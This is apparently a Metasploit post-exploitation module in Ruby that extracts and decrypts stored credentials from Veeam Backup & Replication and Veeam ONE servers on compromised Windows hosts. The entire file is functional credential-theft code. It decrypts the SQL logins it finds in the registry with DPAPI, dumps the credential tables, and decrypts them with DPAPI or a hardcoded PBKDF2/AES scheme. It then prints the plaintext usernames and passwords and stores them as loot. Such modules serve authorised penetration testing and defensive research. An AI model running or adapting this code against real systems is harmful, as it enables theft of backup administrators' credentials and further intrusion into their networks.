##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::MSSQL
  include Msf::Post::Windows::Powershell
  include Msf::Post::Windows::Registry

  Rank = ManualRanking
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Veeam Backup and Replication Credentials Dump',
        'Description' => %q{
          This module exports and decrypts credentials from Veeam Backup & Replication and
          Veeam ONE Monitor Server to a CSV file; it is intended as a post-exploitation
          module for Windows hosts with either of these products installed. The module
          supports automatic detection of VBR / Veeam ONE and is capable of decrypting
          credentials for all versions including the latest build of 11.x.
        },
        'Author' => 'npm[at]cesium137.io',
        'Platform' => [ 'win' ],
        'DisclosureDate' => '2022-11-22',
        'SessionTypes' => [ 'meterpreter' ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://blog.checkymander.com/red%20team/veeam/decrypt-veeam-passwords/']
        ],
        'Actions' => [
          [
            'Dump',
            {
              'Description' => 'Export Veeam Backup & Replication database and perform decryption'
            }
          ],
          [
            'Export',
            {
              'Description' => 'Export Veeam Backup & Replication database without decryption'
            }
          ]
        ],
        'DefaultAction' => 'Dump',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ IOC_IN_LOGS ]
        },
        'Privileged' => true
      )
    )
    register_advanced_options([
      OptBool.new('BATCH_DPAPI', [ true, 'Perform DPAPI PowerShell decryption in a single call', true ])
    ])
  end

  def export_header_row
    'ID,USN,Username,Password,Description,Visible'
  end

  def result_header_row
    'ID,USN,Username,Plaintext,Description,Method,Visible'
  end

  def vbr?
    @vbr_build && @vbr_build > ::Rex::Version.new('0')
  end

  def vom?
    @vom_build && @vom_build > ::Rex::Version.new('0')
  end

  def run
    init_module
    current_action = action.name.downcase
    if current_action == 'export' || current_action == 'dump'
      if vbr?
        print_status('Performing export of Veeam Backup & Replication SQL database to CSV file')
        vbr_encrypted_csv_file = export('vbr')
        print_good("Encrypted Veeam Backup & Replication Database Dump: #{vbr_encrypted_csv_file}")
      end
      if vom?
        print_status('Performing export of Veeam ONE Monitor SQL database to CSV file')
        vom_encrypted_csv_file = export('vom')
        print_good("Encrypted Veeam ONE Monitor Database Dump: #{vom_encrypted_csv_file}")
      end
    end
    if current_action == 'dump'
      if vbr?
        fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid VBR CSV input file') unless ::File.file?(vbr_encrypted_csv_file)

        print_status('Performing decryption of Veeam Backup & Replication SQL database')
        vbr_decrypted_csv_file = decrypt(vbr_encrypted_csv_file, 'vbr')
        print_good("Decrypted Veeam Backup & Replication Database Dump: #{vbr_decrypted_csv_file}")
      end
      if vom?
        fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid VOM CSV input file') unless ::File.file?(vom_encrypted_csv_file)

        print_status('Performing decryption of Veeam ONE Monitor SQL database')
        vom_decrypted_csv_file = decrypt(vom_encrypted_csv_file, 'vom')
        print_good("Decrypted Veeam ONE Monitor Database Dump: #{vom_decrypted_csv_file}")
      end
    end
  end

  def export(target)
    target_name = target.downcase
    case target_name
    when 'vbr'
      csv = dump_vbr_db
      db_name = @vbr_db_name
      total_secrets = @vbr_total_secrets
    when 'vom'
      csv = dump_vom_db
      db_name = @vom_db_name
      total_secrets = @vom_total_secrets
    else
      return nil
    end
    total_rows = csv.count
    print_good("#{total_rows} rows exported, #{total_secrets} unique IDs")
    encrypted_data = csv.to_s.delete("\000")
    store_loot("veeam_#{target_name}_enc", 'text/csv', rhost, encrypted_data, "#{db_name}.csv", 'Encrypted Database Dump')
  end

  def decrypt(csv_file, target)
    case target.downcase
    when 'vbr'
      target_name = 'VBR'
      target_vbr = true
      target_vom = false
    when 'vom'
      target_name = 'VOM'
      target_vom = true
      target_vbr = false
    else
      return nil
    end
    csv = read_csv_file(csv_file)
    total_rows = csv.count
    total_secrets = @vbr_total_secrets if target_vbr
    total_secrets = @vom_total_secrets if target_vom
    print_good("#{total_rows} #{target_name} rows loaded, #{total_secrets} unique IDs")
    result = decrypt_vbr_db(csv) if target_vbr
    result = decrypt_vom_db(csv) if target_vom
    processed_rows = result[:processed_rows]
    blank_rows = result[:blank_rows]
    decrypted_rows = result[:decrypted_rows]
    plaintext_rows = result[:plaintext_rows]
    failed_rows = result[:failed_rows]
    result_rows = result[:result_csv]
    fail_with(Msf::Exploit::Failure::Unknown, "Failed to decrypt #{target_name} CSV dataset") unless result_rows

    total_result_rows = result_rows.count - 1 # Do not count header row
    total_result_secrets = result_rows['ID'].uniq.count - 1
    if processed_rows == failed_rows || total_result_rows <= 0
      fail_with(Msf::Exploit::Failure::NoTarget, 'No rows could be processed')
    elsif failed_rows > 0
      print_warning("#{processed_rows} #{target_name} rows processed (#{failed_rows} rows failed)")
    else
      print_good("#{processed_rows} #{target_name} rows processed")
    end
    total_records = decrypted_rows + plaintext_rows
    print_status("#{total_records} rows recovered: #{plaintext_rows} plaintext, #{decrypted_rows} decrypted (#{blank_rows} blank)")
    decrypted_data = result_rows.to_s.delete("\000")
    print_status("#{total_result_rows} rows written (#{blank_rows} blank rows withheld)")
    print_good("#{total_result_secrets} unique #{target_name} ID records recovered")
    plunder(result_rows)
    res = store_loot('veeam_vbr_dec', 'text/csv', rhost, decrypted_data, "#{@vbr_db_name}.csv", "Decrypted #{target_name} Database Dump") if target_vbr
    res = store_loot('veeam_vom_dec', 'text/csv', rhost, decrypted_data, "#{@vom_db_name}.csv", "Decrypted #{target_name} Database Dump") if target_vom
    res
  end

  def dump_vbr_db
    sql_query = 'SET NOCOUNT ON;SELECT [id] ID,[usn] USN,[user_name] Username,[password] Password,[description] Description,[visible] Visible FROM dbo.Credentials'
    sql_cmd = sql_prepare(sql_query, 'vbr')
    print_status('Export Veeam Backup & Replication DB ...')
    query_result = cmd_exec(sql_cmd)
    fail_with(Msf::Exploit::Failure::Unknown, query_result) if query_result.downcase.start_with?('sqlcmd: ') || query_result.downcase.start_with?('msg ')

    csv = ::CSV.parse(query_result.gsub("\r", ''), row_sep: :auto, headers: export_header_row, quote_char: "\x00", skip_blanks: true)
    fail_with(Msf::Exploit::Failure::Unknown, 'Error parsing VBR SQL dataset into CSV format') unless csv

    @vbr_total_secrets = csv['ID'].uniq.count
    fail_with(Msf::Exploit::Failure::Unknown, 'VBR SQL dataset contains no ID column values') unless @vbr_total_secrets >= 1 && !csv['ID'].uniq.first.nil?

    csv
  end

  def dump_vom_db
    sql_query = "SET NOCOUNT ON;SELECT [uid] ID, [id] USN, [name] Username, [password] Password,'VeeamONE Credential' Description,0 Visible FROM [collector].[user] WHERE [collector].[user].[name] IS NOT NULL AND [collector].[user].[name] NOT LIKE ''"
    sql_cmd = sql_prepare(sql_query, 'vom')
    print_status('Export Veeam ONE Monitor DB ...')
    query_result = cmd_exec(sql_cmd)
    fail_with(Msf::Exploit::Failure::Unknown, query_result) if query_result.downcase.start_with?('sqlcmd: ') || query_result.downcase.start_with?('msg ')

    csv = ::CSV.parse(query_result.gsub("\r", ''), row_sep: :auto, headers: export_header_row, quote_char: "\x00", skip_blanks: true)
    fail_with(Msf::Exploit::Failure::Unknown, 'Error parsing VOM SQL dataset into CSV format') unless csv

    @vom_total_secrets = csv['ID'].uniq.count
    fail_with(Msf::Exploit::Failure::Unknown, 'VOM SQL dataset contains no ID column values') unless @vom_total_secrets >= 1 && !csv['ID'].uniq.first.nil?

    csv
  end

  def decrypt_vbr_db(csv_dataset)
    current_row = 0
    decrypted_rows = 0
    plaintext_rows = 0
    blank_rows = 0
    failed_rows = 0
    result_csv = ::CSV.parse(result_header_row, headers: :first_row, write_headers: true, return_headers: true)
    plaintext_array = []
    print_status('Process Veeam Backup & Replication DB ...')
    blank_b64 = psh_exec("Add-Type -AssemblyName System.Security;[Convert]::ToBase64String([Security.Cryptography.ProtectedData]::Protect([String]::Empty, $Null, 'LocalMachine'))").delete("\000")
    vprint_status("Generated blank DPAPI blob #{blank_b64}")
    if datastore['BATCH_DPAPI']
      csv_dataset.each do |row|
        secret_ciphertext = row['Password']
        if secret_ciphertext.nil?
          plaintext_array << blank_b64
        else
          plaintext_array << ::Base64.strict_encode64(::Base64.decode64(secret_ciphertext))
        end
      end
      secret_plaintext_array = veeam_vbr_decrypt(plaintext_array).delete("\000").gsub("\r", '').split("\n")
    end
    csv_dataset.each do |row|
      current_row += 1
      credential_id = row['ID']
      if credential_id.nil?
        failed_rows += 1
        print_error("Row #{current_row} missing ID column, skipping")
        next
      end
      secret_usn = row['USN']
      secret_username = row['Username']
      secret_description = row['Description']
      secret_visible = row['Visible']
      if datastore['BATCH_DPAPI']
        secret_plaintext = secret_plaintext_array[current_row - 1]
      else
        secret_ciphertext = row['Password']
        if secret_ciphertext.nil?
          vprint_warning("ID #{credential_id} Password column nil, excluding")
          blank_rows += 1
          next
        else
          secret_plaintext = veeam_vbr_decrypt(secret_ciphertext).delete("\000")
        end
      end
      if secret_plaintext.nil? || secret_plaintext.empty?
        vprint_warning("ID #{credential_id} username '#{secret_username}' decrypted Password nil, excluding")
        blank_rows += 1
        next
      end
      if !secret_plaintext
        print_error("ID #{credential_id} username '#{secret_username}' failed to decrypt")
        vprint_error(row.to_s)
        failed_rows += 1
        next
      end
      secret_disposition = 'DPAPI'
      decrypted_rows += 1
      result_line = [credential_id.to_s, secret_usn.to_s, secret_username.to_s, secret_plaintext.to_s, secret_description.to_s, secret_visible.to_s]
      result_row = ::CSV.parse_line(CSV.generate_line(result_line).gsub("\r", ''))
      result_csv << result_row
      vprint_status("ID #{credential_id} username '#{secret_username}' password recovered: #{secret_disposition}")
    end
    {
      processed_rows: current_row,
      blank_rows: blank_rows,
      decrypted_rows: decrypted_rows,
      plaintext_rows: plaintext_rows,
      failed_rows: failed_rows,
      result_csv: result_csv
    }
  end

  def decrypt_vom_db(csv_dataset)
    current_row = 0
    decrypted_rows = 0
    plaintext_rows = 0
    blank_rows = 0
    failed_rows = 0
    result_csv = ::CSV.parse(result_header_row, headers: :first_row, write_headers: true, return_headers: true)
    print_status('Process Veeam ONE Monitor DB ...')
    csv_dataset.each do |row|
      current_row += 1
      credential_id = row['ID']
      if credential_id.nil?
        failed_rows += 1
        print_error("Row #{current_row} missing ID column, skipping")
        next
      end
      secret_usn = row['USN']
      secret_username = row['Username']
      secret_description = row['Description']
      secret_visible = row['Visible']
      secret_ciphertext = row['Password']
      if secret_ciphertext.nil?
        vprint_warning("ID #{credential_id} Password column nil, excluding")
        blank_rows += 1
        next
      else
        vom_cred = veeam_vom_decrypt(secret_ciphertext)
        secret_plaintext = vom_cred['Plaintext'] if vom_cred.key?('Plaintext')
        secret_disposition = vom_cred['Method'] if vom_cred.key?('Method')
      end
      if secret_plaintext.nil? || secret_plaintext.empty?
        vprint_warning("ID #{credential_id} username '#{secret_username}' decrypted Password nil, excluding")
        blank_rows += 1
        next
      end
      if !secret_plaintext
        print_error("ID #{credential_id} username '#{secret_username}' failed to decrypt")
        vprint_error(row.to_s)
        failed_rows += 1
        next
      end
      decrypted_rows += 1
      result_line = [credential_id.to_s, secret_usn.to_s, secret_username.to_s, secret_plaintext.to_s, secret_description.to_s, secret_disposition.to_s, secret_visible.to_s]
      result_row = ::CSV.parse_line(CSV.generate_line(result_line).gsub("\r", ''))
      result_csv << result_row
      vprint_status("ID #{credential_id} username '#{secret_username}' password recovered: #{secret_disposition}")
    end
    {
      processed_rows: current_row,
      blank_rows: blank_rows,
      decrypted_rows: decrypted_rows,
      plaintext_rows: plaintext_rows,
      failed_rows: failed_rows,
      result_csv: result_csv
    }
  end

  def init_module
    veeam_hostname = get_env('COMPUTERNAME')
    print_status("Hostname #{veeam_hostname} IPv4 #{rhost}")
    require_sql = action.name.downcase == 'export' || action.name.downcase == 'dump'
    get_vbr_version
    get_vom_version
    fail_with(Msf::Exploit::Failure::NoTarget, 'No Veeam products detected') unless @vbr_build || @vom_build
    if require_sql
      get_sql_client
      fail_with(Msf::Exploit::Failure::BadConfig, 'Unable to identify sqlcmd SQL client on target host') unless @sql_client == 'sqlcmd'

      vprint_good("Found SQL client: #{@sql_client}")
      init_veeam_db
    end
  end

  def read_csv_file(file_name)
    fail_with(Msf::Exploit::Failure::NoTarget, "CSV file #{file_name} not found") unless ::File.file?(file_name)

    csv_rows = ::File.binread(file_name)
    csv = ::CSV.parse(csv_rows.gsub("\r", ''), row_sep: :auto, headers: :first_row, quote_char: "\x00", skip_blanks: true)
    fail_with(Msf::Exploit::Failure::NoTarget, "Error importing CSV file #{file_name}") unless csv

    @vbr_total_secrets = csv['ID'].uniq.count
    unless @vbr_total_secrets >= 1 && !csv['ID'].uniq.first.nil?
      fail_with(Msf::Exploit::Failure::NoTarget, "Provided CSV file #{file_name} contains no ID column values")
    end
    csv
  end

  def get_vbr_version
    return nil unless (vbr_path = get_vbr_path)

    vbr_dll_file = "#{vbr_path}\\Packages\\VeeamDeploymentDll.dll"
    unless file_exist?(vbr_dll_file)
      print_error("Could not read Veeam deployment DLL at #{vbr_dll_file}")
      return nil
    end
    cmd_str = "(Get-Item -Path '#{vbr_dll_file}').VersionInfo.ProductVersion"
    vbr_version = psh_exec(cmd_str)
    @vbr_build = ::Rex::Version.new(vbr_version)
    if @vbr_build > ::Rex::Version.new('0')
      print_status("Veeam Backup & Replication Build #{@vbr_build}")
    else
      print_error('Error determining Veeam Backup & Replication version')
      @vbr_build = nil
    end
  end

  def get_vom_version
    return nil unless (vom_path = get_vom_path)

    vom_exe_file = "#{vom_path}\\VeeamDCS.exe"
    unless file_exist?(vom_exe_file)
      print_error("Could not read Veeam ONE binary #{vom_exe_file}")
      return nil
    end
    cmd_str = "(Get-Item -Path '#{vom_exe_file}').VersionInfo.ProductVersion"
    vom_version = psh_exec(cmd_str)
    @vom_build = ::Rex::Version.new(vom_version)
    if @vom_build > ::Rex::Version.new('0')
      print_status("Veeam ONE Monitor Build #{@vom_build}")
      cmd_str = "[Convert]::ToBase64String((Get-ItemPropertyValue -Path 'HKLM:\\SOFTWARE\\Veeam\\Veeam ONE\\Private\\' -Name Entropy))"
      vom_entropy = psh_exec(cmd_str)
      @vom_entropy_b64 = vom_entropy if vom_entropy.match?(%r{^[-A-Za-z0-9+/]*={0,3}$})
    else
      print_error('Error determining Veeam ONE Monitor version')
      @vom_build = nil
    end
  end

  def get_vbr_path
    reg_key = 'HKLM\\SOFTWARE\\Veeam\\Veeam Backup and Replication'
    unless registry_key_exist?(reg_key)
      vprint_warning("Registry key #{reg_key} does not exist, Veeam Backup and Replication does not appear to be installed")
      return nil
    end
    vbr_path = registry_getvaldata(reg_key, 'CorePath').to_s.gsub(/\\$/, '')
    unless vbr_path
      print_error("Could not find CorePath registry entry under #{reg_key}")
      return nil
    end
    print_status("Veeam Backup & Replication Install Path: #{vbr_path}")
    vbr_path
  end

  def get_vom_path
    reg_key = 'HKLM\\SOFTWARE\\Veeam\\Veeam ONE Monitor\\Service'
    unless registry_key_exist?(reg_key)
      vprint_warning("Registry key #{reg_key} does not exist, Veeam ONE Monitor Server does not appear to be installed")
      return nil
    end
    vom_client_path = registry_getvaldata(reg_key, 'MonitorX64ClientDistributivePath').to_s
    unless vom_client_path
      print_error("Could not find MonitorX64ClientDistributivePath registry entry under #{reg_key}")
      return nil
    end
    vom_path = vom_client_path.split('\ClientPackages\VeeamONE.Monitor.Client.x64.msi').first.to_s.gsub(/\\$/, '')
    print_status("Veeam ONE Monitor Install Path: #{vom_path}")
    vom_path
  end

  def sql_prepare(sql_query, target)
    case target.downcase
    when 'vbr'
      if @vbr_db_integrated_auth
        sql_cmd_pre = "\"#{@vbr_db_name}\" -S #{@vbr_db_instance_path} -E"
      else
        sql_cmd_pre = "\"#{@vbr_db_name}\" -S #{@vbr_db_instance_path} -U \"#{@vbr_db_user}\" -P \"#{@vbr_db_pass}\""
      end
    when 'vom'
      if @vom_db_integrated_auth
        sql_cmd_pre = "\"#{@vom_db_name}\" -S #{@vom_db_instance_path} -E"
      else
        sql_cmd_pre = "\"#{@vom_db_name}\" -S #{@vom_db_instance_path} -U \"#{@vom_db_user}\" -P \"#{@vom_db_pass}\""
      end
    else
      return nil
    end
    "#{@sql_client} -d #{sql_cmd_pre} -Q \"#{sql_query}\" -h-1 -s\",\" -w 65535 -W -I".gsub("\r", '').gsub("\n", '')
  end

  def init_veeam_db
    print_status('Get Veeam SQL Parameters ...')
    vbr_db_conf = get_vbr_database_config if vbr?
    vom_db_conf = get_vom_database_config if vom?
    if vbr? && vbr_db_conf
      vbr_conf = db_conf_build(vbr_db_conf)
      @vbr_db_instance_path = vbr_conf['db_instance_path']
      @vbr_db_name = vbr_conf['db_name']
      @vbr_db_user = vbr_conf['db_user']
      @vbr_db_pass = vbr_conf['db_pass']
      @vbr_db_integrated_auth = vbr_conf['db_integrated_auth']
    end
    if vom? && vom_db_conf
      vom_conf = db_conf_build(vom_db_conf)
      @vom_db_instance_path = vom_conf['db_instance_path']
      @vom_db_name = vom_conf['db_name']
      @vom_db_user = vom_conf['db_user']
      @vom_db_pass = vom_conf['db_pass']
      @vom_db_integrated_auth = vom_conf['db_integrated_auth']
    end
  end

  def db_conf_build(db_conf)
    db_instance_path = db_conf['DATA SOURCE']
    db_name = db_conf['INITIAL CATALOG']
    db_user = db_conf['USER ID']
    db_pass_enc = db_conf['PASSWORD']
    if db_pass_enc.nil?
      db_pass = nil
    else
      db_pass = db_pass_enc
    end
    db_auth = db_conf['INTEGRATED SECURITY']
    fail_with(Msf::Exploit::Failure::NoTarget, 'Failed to recover database parameters') if db_instance_path.nil? || db_name.nil?

    res = {
      'db_instance_path' => db_instance_path,
      'db_name' => db_name
    }
    print_good('SQL Database Connection Configuration:')
    print_good("\tInstance Name: #{db_instance_path}")
    print_good("\tDatabase Name: #{db_name}")
    if !db_auth.nil?
      if db_auth.downcase == 'true' || db_auth.downcase == 'sspi'
        print_good("\tDatabase User: (Windows Integrated)")
        print_warning('The database uses Windows authentication')
        print_warning('Session identity must have access to the SQL server instance to proceed')
        res['db_integrated_auth'] = true
      end
    elsif !db_user.nil? && !db_pass.nil?
      extra_service_data = {
        address: Rex::Socket.getaddress(rhost),
        port: 1433,
        service_name: 'mssql',
        protocol: 'tcp',
        workspace_id: myworkspace_id,
        module_fullname: fullname,
        origin_type: :service,
        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
        realm_value: db_instance_path
      }
      store_valid_credential(user: db_user, private: db_pass, service_data: extra_service_data)
      print_good("\tDatabase User: #{db_user}")
      print_good("\tDatabase Pass: #{db_pass}")
      res['db_integrated_auth'] = false
      res['db_user'] = db_user
      res['db_pass'] = db_pass
    else
      fail_with(Msf::Exploit::Failure::NoTarget, 'Could not extract SQL login information')
    end
    res
  end

  def get_vbr_database_config
    # Bog-standard MachineKey DPAPI with no additional entropy
    reg_key = 'HKLM\\SOFTWARE\\Veeam\\Veeam Backup and Replication'
    fail_with(Msf::Exploit::Failure::NoTarget, "Could not read #{reg_key}") unless registry_key_exist?(reg_key)

    mssql_host = registry_getvaldata(reg_key, 'SqlServerName').to_s.delete("\000")
    mssql_instance = registry_getvaldata(reg_key, 'SqlInstanceName').to_s.delete("\000")
    mssql_db = registry_getvaldata(reg_key, 'SqlDatabaseName').to_s.delete("\000")
    fail_with(Msf::Exploit::Failure::NoTarget, "Could not read SQL parameters from #{reg_key}") unless mssql_host && mssql_instance && mssql_db

    mssql_login = registry_getvaldata(reg_key, 'SqlLogin').to_s.delete("\000")
    mssql_pass_enc = registry_getvaldata(reg_key, 'SqlSecuredPassword').to_s.delete("\000")
    res = {
      'DATA SOURCE' => "#{mssql_host}\\#{mssql_instance}",
      'INITIAL CATALOG' => mssql_db
    }
    if !mssql_login.empty? && !mssql_pass_enc.empty?
      cmd_str = "Add-Type -AssemblyName System.Security;[Text.Encoding]::Unicode.GetString([Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('#{mssql_pass_enc}'), $Null, 'LocalMachine'))"
      mssql_pass = psh_exec(cmd_str)
    end
    if !mssql_pass
      res['INTEGRATED SECURITY'] = 'true'
    else
      res['USER ID'] = mssql_login
      res['PASSWORD'] = mssql_pass
    end
    res
  end

  def get_vom_database_config
    # MachineKey DPAPI with static entropy twist:
    # Static entropy is Base64 encoded BINARY_BLOB of UTF-16LE text "{F0F8C9DE-AB1E-48b6-8221-665E5B016E70}"
    # This value is burned into VeeamRegSettings.dll
    reg_key = 'HKLM\\SOFTWARE\\Veeam\\Veeam ONE Monitor\\db_config'
    fail_with(Msf::Exploit::Failure::NoTarget, "Could not read #{reg_key}") unless registry_key_exist?(reg_key)

    mssql_instance_path = registry_getvaldata(reg_key, 'host').to_s.delete("\000")
    mssql_host = mssql_instance_path.split('\\')[0]
    mssql_instance = mssql_instance_path.split('\\')[1]
    mssql_db = registry_getvaldata(reg_key, 'db_name').to_s.delete("\000")
    fail_with(Msf::Exploit::Failure::NoTarget, "Could not read SQL parameters from #{reg_key}") unless mssql_host && mssql_instance && mssql_db

    mssql_login = registry_getvaldata(reg_key, 'db_auth_sql').to_s.delete("\000").to_i
    if mssql_login > 0
      mssql_user_enc = registry_getvaldata(reg_key, 'db_login').to_s.delete("\000")
      mssql_pass_enc = registry_getvaldata(reg_key, 'db_password').to_s.delete("\000")
    end
    res = {
      'DATA SOURCE' => "#{mssql_host}\\#{mssql_instance}",
      'INITIAL CATALOG' => mssql_db
    }
    if mssql_user_enc && mssql_pass_enc
      cmd_str = "Add-Type -AssemblyName System.Security;[Text.Encoding]::Unicode.GetString([Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('#{mssql_user_enc}'), [Convert]::FromBase64String('ewBGADAARgA4AEMAOQBEAEUALQBBAEIAMQBFAC0ANAA4AGIANgAtADgAMgAyADEALQA2ADYANQBFADUAQgAwADEANgBFADcAMAB9AA=='), 'LocalMachine'))"
      mssql_user = psh_exec(cmd_str)
      cmd_str = "Add-Type -AssemblyName System.Security;[Text.Encoding]::Unicode.GetString([Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('#{mssql_pass_enc}'), [Convert]::FromBase64String('ewBGADAARgA4AEMAOQBEAEUALQBBAEIAMQBFAC0ANAA4AGIANgAtADgAMgAyADEALQA2ADYANQBFADUAQgAwADEANgBFADcAMAB9AA=='), 'LocalMachine'))"
      mssql_pass = psh_exec(cmd_str)
    else
      mssql_pass = nil
    end
    if mssql_login == 0
      res['INTEGRATED SECURITY'] = 'true'
    elsif mssql_login == 1 && mssql_user && mssql_pass
      res['USER ID'] = mssql_user
      res['PASSWORD'] = mssql_pass
    else
      fail_with(Msf::Exploit::Failure::NoTarget, 'Failed to extract SQL native login credential')
    end
    res
  end

  def veeam_vbr_decrypt(b64)
    if b64.is_a?(Array)
      # Gets around having to call psh_exec for every row at the expense of piling every B64 secret directly into the command line
      # Limitations of this approach include death when the max command line buffer size is exhausted, YMMV
      # From the operator's perspective this is controlled by way of the BATCH_DPAPI advanced option, defaulted true; can be unset to make sequential calls to psh_exec instead
      secrets_ps_array = "@(#{b64.map { |s| "'#{s}'" }.join(',')})"
      cmd_str = "Add-Type -AssemblyName System.Security;#{secrets_ps_array}|ForEach-Object {[Text.Encoding]::ASCII.GetString([Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($_), $Null, 'LocalMachine'))}"
    elsif b64.is_a?(String)
      cmd_str = "Add-Type -AssemblyName System.Security;[Text.Encoding]::ASCII.GetString([Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('#{b64}'), $Null, 'LocalMachine'))"
    else
      return nil
    end
    plaintext = psh_exec(cmd_str)
    unless plaintext
      print_error('Bad DPAPI decrypt')
      return nil
    end
    plaintext
  end

  def veeam_vom_decrypt(b64)
    unless b64.match?(%r{^[-A-Za-z0-9+/]*={0,3}$})
      print_error('Invalid Base64 ciphertext')
      return nil
    end
    # Veeam ONE switched from weaksauce PBKDF2 to DPAPI with static entropy between 11.0.0 and 11.0.1
    # DPAPI is in use if there is an an "Entropy" value under HKLM:\SOFTWARE\Veeam\Veeam ONE\Private\
    if !@vom_entropy_b64.nil? && !@vom_entropy_b64.empty? # New-style (DPAPI)
      cmd_str = "Add-Type -AssemblyName System.Security;[Text.Encoding]::Unicode.GetString([Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('#{b64}'),[Convert]::FromBase64String('#{@vom_entropy_b64}'), 'LocalMachine'))"
      plaintext = psh_exec(cmd_str)
      disposition = 'DPAPI'
    else # Old-style (static PBKDF2_HMAC_SHA1 derived AES-128-CBC key)
      bytes = ::Base64.strict_decode64(b64)
      key_salt = bytes[0..15]
      aes_iv = bytes[16..31]
      ciphertext = bytes[32..]
      aes_key = ::OpenSSL::KDF.pbkdf2_hmac('123456789', salt: key_salt, iterations: 1000, length: 16, hash: 'sha1')
      decryptor = ::OpenSSL::Cipher.new('aes-128-cbc')
      decryptor.decrypt
      decryptor.padding = 1
      decryptor.key = aes_key
      decryptor.iv = aes_iv
      plaintext = (decryptor.update(ciphertext) + decryptor.final)
      disposition = 'AES'
    end
    { 'Plaintext' => plaintext, 'Method' => disposition }
  end

  def plunder(rowset)
    rowset.each_with_index do |row, idx|
      next if idx == 0 # Skip header row

      next unless (loot_pass = row['Plaintext'])

      loot_user = row['Username'] ||= ''
      loot_desc = row['Description'] ||= 'Veeam Credential'
      extra_service_data = {
        address: Rex::Socket.getaddress(rhost),
        port: 6160,
        service_name: 'veeam',
        protocol: 'tcp',
        workspace_id: myworkspace_id,
        module_fullname: fullname,
        origin_type: :service,
        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
        realm_value: loot_desc
      }
      store_valid_credential(user: loot_user, private: loot_pass, service_data: extra_service_data)
      print_good("Recovered Credential: #{loot_desc}")
      print_good("\tL: #{loot_user}")
      print_good("\tP: #{loot_pass}")
    end
  end
end
